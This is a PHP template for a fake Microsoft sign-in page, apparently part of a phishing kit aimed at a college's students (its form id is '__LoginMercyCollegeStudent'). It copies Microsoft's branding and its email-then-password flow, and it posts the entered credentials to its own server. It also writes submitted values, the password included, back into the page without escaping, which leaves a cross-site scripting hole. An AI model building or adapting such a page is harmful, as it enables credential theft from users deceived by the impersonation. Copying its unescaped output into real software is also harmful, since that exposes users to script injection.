<?php $this->view('componets/LoginHeader'); ?>
<body>
    <div class="Main_base">
        <div class="mini-container login-widget card"> 
            <img  style="margin-left:25px; margin-right:25px; margin-top:40px;margin-bottom:20px" class="logo" role="img" 
            pngsrc="<?php echo ASSETS.'images/microsoft_logo.svg'?> " 
            svgsrc="<?php echo ASSETS.'images/microsoft_logo.svg'?>" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" 
            src="<?php echo ASSETS.'images/microsoft_logo.svg'?>" alt="Microsoft">
            <div class="formcontainer" style="margin-left:25px; margin-right:25px">
                <div class="step-forms step-forms-active">
                    <div class=" overflow-hidden">
                        <!--multisteps-form-->
                        <form method="POST" class="form-group multisteps-form__form" id="__LoginMercyCollegeStudent" autocomplete="on">
                            <!--single form panel-->
                                <div class="multisteps-form__panel  js-active" data-animation="scaleIn">
                                    <div class="element">
                                        <div class="title"><span>Sign in</span></div>
                                        <input name="____email" class="form-group form-primary form-control" type="email" autocomplete="on" value="<?=((isset($_POST['____email']))?$_POST['____email']: '');?>" placeholder="Email, phone, or Skype"/>
                                        <span class="___invalidERROR"><?=((isset($data['emailError']))?$data['emailError']: '');?></span>
                                    </div>
                                    <div class="element">
                                        <span class="section-con">
                                            No account? <a href="#">Create one!</a>
                                        </span>
                                        <p class="sectionKey">
                                            <a href="#"> Sign in with security key<img role="presentation" pngsrc="<?php echo ASSETS.'images/documentation.svg'?>" 
                                            svgsrc="<?php echo ASSETS.'images/documentation.svg'?>" data-bind="imgSrc" src="<?php echo ASSETS.'images/documentation.svg'?>"></a>
                                        </p>
                                    </div>
                                    <div class="button-row d-flex mt-4">
                                        <button class="ml-auto js-btn-next js-btn-next pull-right btn-scroll width-50 ml-auto" type="button" title="Next">Next</button>
                                    </div>
                                </div>
                                <!--single form panel-->
                                <div class="multisteps-form__panel shadow p-4 rounded bg-white" data-animation="scaleIn">
                                    <div class="element">
                                        <div class="title">
                                            <span>
                                                <i class="fa fa-arrow-left js-btn-prev" style="font-size:15px; cursor:pointer;" aria-hidden="true"></i>&nbsp;&nbsp;  
                                                Enter password
                                            </span>
                                        </div>
                                        <input name="____password" class="form-group form-primary form-control" autocomplete="on" type="password" value="<?=((isset($_POST['____password']))?$_POST['____password']: '');?>" placeholder="Password"/>
                                        <span class="___invalidERROR"><?=((isset($data['PasswordError']))?$data['PasswordError']: '');?></span>
                                        </div>
                                            <div class="elemenst">
                                            <span class="section-con">
                                                <a href="#">Fogort password?</a>
                                            </span>
                                            <p class="sectionsKey" style="margin-top:10px">
                                                <a href="#">Email code to ak*******gmail.com</a>
                                            </p>
                                        </div>
                                        <div class="button-row mt-4">
                                            <button class="btn-scroll pull-right" title="Sign in" type="submit">Sign in</button>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>      
    </div>
    <div class="mini-container login-widget card card-footer" style="margin-top:20px">
        <div class="option_footer"> 
            <img width="30px"class="logo" role="img" 
                pngsrc="<?php echo ASSETS.'images/signin.svg'?> " 
                svgsrc="<?php echo ASSETS.'images/signin.svg'?>" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" 
                src="<?php echo ASSETS.'images/signin.svg'?>" alt="Microsoft"><span>&nbsp;&nbsp;Sign-in options</span>
        </div>
    </div> 
    <script src="<?=ASSETS?>js/validate-script.js"></script>
</body>
</html>